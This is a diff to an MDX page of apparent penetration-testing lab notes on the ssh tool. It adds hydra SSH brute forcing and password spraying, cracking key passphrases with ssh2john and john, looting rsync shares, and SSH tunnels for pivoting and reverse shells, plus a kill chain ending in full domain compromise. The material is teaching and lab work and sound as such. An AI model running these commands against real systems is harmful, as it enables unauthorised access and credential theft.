@@ -9,6 +9,103 @@ hideFooterPagination: true
 
 {/* Generated from Commands/ssh.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## ssh: choose the operation and read the result
+
+Open an SSH session or forward a port.
+
+### What the result establishes
+
+Verify the server host key, selected account and actual remote identity before interpreting shell behavior.
+
+### Prerequisites and common failures
+
+A valid account may be restricted to SFTP, a forced command or forwarding only; local and remote forwarding directions are easy to confuse.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+ssh USER@TARGET_IP
+chmod 600 id_rsa
+ssh -i id_rsa USER@TARGET_IP
+```
+
+### Example 2: Attacking SSH
+
+Run in: **Saved lab example**.
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa user@<IP>
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Attacking SSH
+
+Run in: **Saved lab example**.
+
+```bash
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<IP>
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Attacking SSH
+
+Run in: **Saved lab example**.
+
+```bash
+ssh2john id_rsa > id_rsa.hash             # convert the encrypted key to a crackable hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   # recover the passphrase
+ssh -i id_rsa user@<IP>                   # now unlock the key with the cracked passphrase
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Rsync
+
+Run in: **Saved lab example**.
+
+```bash
+sudo nmap -sV -p 873 <IP>
+nc -nv <IP> 873          # then send: @RSYNCD: 31.0  /  #list   to enumerate modules
+
+rsync -av --list-only rsync://<IP>/<share>     # list a share's contents
+rsync -av rsync://<IP>/<share> ./loot/          # download everything
+rsync -av -e "ssh -p2222" rsync://<IP>/<share> ./loot/   # over SSH, custom port
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#rsync). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Key commands
+
+Run in: **Saved lab example**.
+
+```bash
+ssh -v user@<IP>                                   # verbose: shows offered auth methods
+ssh -v user@<IP> -o PreferredAuthentications=password   # force password (for brute-force)
+ssh -i id_rsa user@<IP>                            # key-based (chmod 600 the key first)
+cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'   # read server config (if on host)
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#key-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Hunting for SSH private keys
+
+Run in: **Saved lab example**.
+
+```bash
+ssh-keygen -yf ~/.ssh/id_rsa
+```
+
+Saved context: [Password Attacks: Cracking, Files, and Credential Stores — Hunting for SSH private keys](/password-attacks/password-attacks-cheat-sheet#hunting-for-ssh-private-keys). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Open an SSH session or forward a port.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=ssh) · [All tools](/index)
@@ -22,6 +119,13 @@ ssh USER@TARGET_IP
 chmod 600 id_rsa
 ssh -i id_rsa USER@TARGET_IP
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 1: Commands](/enumeration/linux-remote-management-protocols-cheat-sheet#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -46,6 +150,13 @@ hydra -L usernames.txt -p 'Texas123!@#' <DMZ_IP> ssh
 nxc smb <DC> -u usernames.txt -p 'Texas123!@#' --continue-on-success | grep '[+]'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 2. Password spraying](/cheatsheets/ad-attack-path-worked-example#2-password-spraying)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)">
@@ -58,6 +169,13 @@ nxc smb <DC> -u usernames.txt -p 'Texas123!@#' --continue-on-success | grep '[+]
 ssh -L 13389:172.16.119.7:3389 jbetty@&lt;DMZ_IP>     # then RDP to 127.0.0.1:13389 (no proxychains)
 xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/cheatsheets/ad-attack-path-worked-example#option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools) · [Windows Remote Access: RDP, WinRM, and WMI — Example 6: Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/enumeration/windows-remote-management-protocols-cheat-sheet#example-6-option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -90,6 +208,13 @@ DCSync against DC01
    ↓  Administrator NTLM + krbtgt
 FULL DOMAIN COMPROMISE
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🗺️ The kill chain (this assessment)](/cheatsheets/ad-attack-path-worked-example#-the-kill-chain-this-assessment)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -129,6 +254,13 @@ dir C:\Users
 type C:\Users\<user>\Desktop\flag.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — Files to Always Check](/enumeration/footprinting-lab-methodology-cheat-sheet#files-to-always-check)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="SSH (Port 22)">
@@ -150,6 +282,13 @@ ssh2john id_rsa > hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — SSH (Port 22)](/enumeration/footprinting-lab-methodology-cheat-sheet#ssh-port-22) · [Hashcat: Modes, Rules, and Masks — Example 5: SSH (Port 22)](/tools/hashcat#example-5-ssh-port-22) · [John the Ripper and File Converters — Example 5: SSH (Port 22)](/tools/john#example-5-ssh-port-22)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="SSH Key Predictable PRNG (Authorized_Keys) Process">
@@ -161,6 +300,13 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```ps1
 ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — SSH Key Predictable PRNG (Authorized_Keys) Process](/privesc/linux-privesc-checklist#ssh-key-predictable-prng-authorized_keys-process)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -175,6 +321,13 @@ chmod 600 id_rsa
 ssh -i id_rsa user@<IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 2: Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#example-2-attacking-ssh) · [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Linux Remote Access: SSH, Rsync, and R-Services**
 
 ```bash
@@ -182,6 +335,13 @@ ssh2john id_rsa > id_rsa.hash             # convert the encrypted key to a crack
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   # recover the passphrase
 ssh -i id_rsa user@<IP>                   # now unlock the key with the cracked passphrase
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 4: Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#example-4-attacking-ssh) · [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh) · [Hashcat: Modes, Rules, and Masks — Example 7: Attacking SSH](/tools/hashcat#example-7-attacking-ssh) · [John the Ripper and File Converters — Example 7: Attacking SSH](/tools/john#example-7-attacking-ssh)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -198,6 +358,13 @@ ssh -i id_rsa user@<IP>                            # key-based (chmod 600 the ke
 cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'   # read server config (if on host)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 6: Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#example-6-key-commands) · [Linux Remote Access: SSH, Rsync, and R-Services — Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#key-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="SSH (22)">
@@ -211,6 +378,13 @@ hydra -L user.list -P password.list ssh://10.129.42.197
 ssh user@10.129.42.197                  # log in once cracked
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — SSH (22)](/password-attacks/password-attacks-cheat-sheet#ssh-22)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Dynamic forwarding: -D">
@@ -223,6 +397,13 @@ ssh user@10.129.42.197                  # log in once cracked
 ssh -D 9050 ubuntu@10.129.30.150
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting Fundamentals: Routes, SOCKS, and Forwards — Dynamic forwarding: -D](/pivoting/fundamentals#dynamic-forwarding-d)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Local forwarding: -L">
@@ -234,6 +415,13 @@ ssh -D 9050 ubuntu@10.129.30.150
 ```bash
 ssh -L 1234:localhost:80 ubuntu@172.16.5.19
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting Fundamentals: Routes, SOCKS, and Forwards — Local forwarding: -L](/pivoting/fundamentals#local-forwarding-l)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -257,6 +445,13 @@ xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychain
 ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 1. SSH port forwarding (no tools needed)](/cheatsheets/pivoting-file-transfer#1-ssh-port-forwarding-no-tools-needed)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting and File Transfer: Field Reference**
 
 Context from the notebook: Add  -fN  to background without a shell:  ssh -fN -D 1080 jbetty@&lt;DMZ_IP> .
@@ -264,6 +459,13 @@ Context from the notebook: Add  -fN  to background without a shell:  ssh -fN -D 
 ```text
 ssh -fN -D 1080 jbetty@<DMZ_IP>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 1. SSH port forwarding (no tools needed)](/cheatsheets/pivoting-file-transfer#1-ssh-port-forwarding-no-tools-needed)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -279,6 +481,13 @@ ssh -D 9050 ubuntu@pivot           # SOCKS5 proxy on your 127.0.0.1:9050
 proxychains -q nmap -sT -Pn 172.16.5.0/24
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — Dynamic port forwarding (-D) → SOCKS + proxychains](/modules/pivoting-tunneling-port-forwarding#dynamic-port-forwarding-d-→-socks-+-proxychains)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Local port forwarding (-L)">
@@ -290,6 +499,13 @@ proxychains -q nmap -sT -Pn 172.16.5.0/24
 ```bash
 ssh -L 8080:172.16.5.5:80 ubuntu@pivot   # your localhost:8080 → internal :80
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — Local port forwarding (-L)](/modules/pivoting-tunneling-port-forwarding#local-port-forwarding-l)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -303,6 +519,13 @@ ssh -L 8080:172.16.5.5:80 ubuntu@pivot   # your localhost:8080 → internal :80
 ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@pivot -vN
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — Remote / reverse port forwarding (-R) → for reverse shells](/modules/pivoting-tunneling-port-forwarding#remote-/-reverse-port-forwarding-r-→-for-reverse-shells)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting, Tunneling, and Port Forwarding: Module Notes**
 
 Context from the notebook: ssh -R pivot_ip:8080:0.0.0.0:8000  forwards the pivot's  8080  → your handler on  8000 .
@@ -310,6 +533,13 @@ Context from the notebook: ssh -R pivot_ip:8080:0.0.0.0:8000  forwards the pivot
 ```text
 ssh -R pivot_ip:8080:0.0.0.0:8000
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — Remote / reverse port forwarding (-R) → for reverse shells](/modules/pivoting-tunneling-port-forwarding#remote-/-reverse-port-forwarding-r-→-for-reverse-shells)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -325,6 +555,13 @@ ssh -L 8080:172.16.5.19:80 user@PIVOT   # local forward: your :8080 -> internal 
 ssh -R 9001:127.0.0.1:9001 user@PIVOT   # remote forward (reach your box from inside)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Proxychains and SSH Tunnels — SSH tunneling](/pivoting/proxychains#ssh-tunneling)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">
@@ -338,6 +575,13 @@ Context from the notebook: RDP over proxychains hangs / cancels SOCKS can't carr
 ```text
 ssh -L 13389:host:3389
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🚨 GLOBAL CAVEATS (the stuff that wasted hours)](/cheatsheets/ad-attack-path-worked-example#-global-caveats-the-stuff-that-wasted-hours)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -353,6 +597,13 @@ Context from the notebook: ❌  proxychains impacket-smbserver  does  not  work.
 ssh -R
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction) · [Pivoting, Tunneling, and Port Forwarding: Module Notes — 5 · Field-tested gotchas](/modules/pivoting-tunneling-port-forwarding#5-·-field-tested-gotchas)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Three kinds of tunnel (pick the right tool)">
@@ -367,6 +618,13 @@ Context from the notebook: SOCKS proxy A port on Kali (e.g. 1080); tools must be
 ssh -D
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Three kinds of tunnel (pick the right tool)](/cheatsheets/pivoting-file-transfer#three-kinds-of-tunnel-pick-the-right-tool)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting and File Transfer: Field Reference**
 
 Context from the notebook: Port forward One specific  host:port  mapped to a local port; no proxychains needed ssh -L 13389:dc:3389
@@ -374,6 +632,13 @@ Context from the notebook: Port forward One specific  host:port  mapped to a loc
 ```text
 ssh -L 13389:dc:3389
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Three kinds of tunnel (pick the right tool)](/cheatsheets/pivoting-file-transfer#three-kinds-of-tunnel-pick-the-right-tool)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -389,6 +654,13 @@ Context from the notebook: Keep  tun0  at 1200 for the whole engagement. Confirm
 ssh -v
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 🚨 THE MTU TRAP](/cheatsheets/pivoting-file-transfer#-the-mtu-trap) · [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="🧯 CAVEATS TABLE">
@@ -402,6 +674,13 @@ Context from the notebook: RDP over proxychains hangs /  ERRCONNECT_CONNECT_CANC
 ```text
 ssh -L
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 🧯 CAVEATS TABLE](/cheatsheets/pivoting-file-transfer#-caveats-table)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -417,6 +696,13 @@ Context from the notebook: Reach a  whole subnet  through the pivot SSH  dynamic
 ssh -D 9050 user@pivot
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — ⏱️ DECISION HEADER — "I need to… → do…"](/modules/pivoting-tunneling-port-forwarding#-decision-header-—-i-need-to…-→-do…)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting, Tunneling, and Port Forwarding: Module Notes**
 
 Context from the notebook: Reach  one internal service  on my localhost SSH  local  forward ssh -L 8080:10.0.0.5:80 user@pivot
@@ -425,6 +711,13 @@ Context from the notebook: Reach  one internal service  on my localhost SSH  loc
 ssh -L 8080:10.0.0.5:80 user@pivot
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — ⏱️ DECISION HEADER — "I need to… → do…"](/modules/pivoting-tunneling-port-forwarding#-decision-header-—-i-need-to…-→-do…)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting, Tunneling, and Port Forwarding: Module Notes**
 
 Context from the notebook: Get a  reverse shell out  of a segment that can't route to me SSH  remote  forward ssh -R pivot_ip:8080:0.0.0.0:8000 user@pivot
@@ -432,6 +725,13 @@ Context from the notebook: Get a  reverse shell out  of a segment that can't rou
 ```text
 ssh -R pivot_ip:8080:0.0.0.0:8000 user@pivot
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — ⏱️ DECISION HEADER — "I need to… → do…"](/modules/pivoting-tunneling-port-forwarding#-decision-header-—-i-need-to…-→-do…)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -447,6 +747,13 @@ Context from the notebook: SSH 22 Encrypted shell ssh &lt;user>@&lt;IP>
 ssh <user>@<IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Linux Remote Access](/reference/master-protocol-service-quick-reference#linux-remote-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ports, Protocols, and Services by Purpose**
 
 Context from the notebook: SSH (key-based) 22 Key auth ssh -i private.key &lt;user>@&lt;IP>
@@ -455,6 +762,21 @@ Context from the notebook: SSH (key-based) 22 Key auth ssh -i private.key &lt;us
 ssh -i private.key <user>@<IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Linux Remote Access](/reference/master-protocol-service-quick-reference#linux-remote-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Linux Remote Access: SSH, Rsync, and R-Services](/enumeration/linux-remote-management-protocols-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
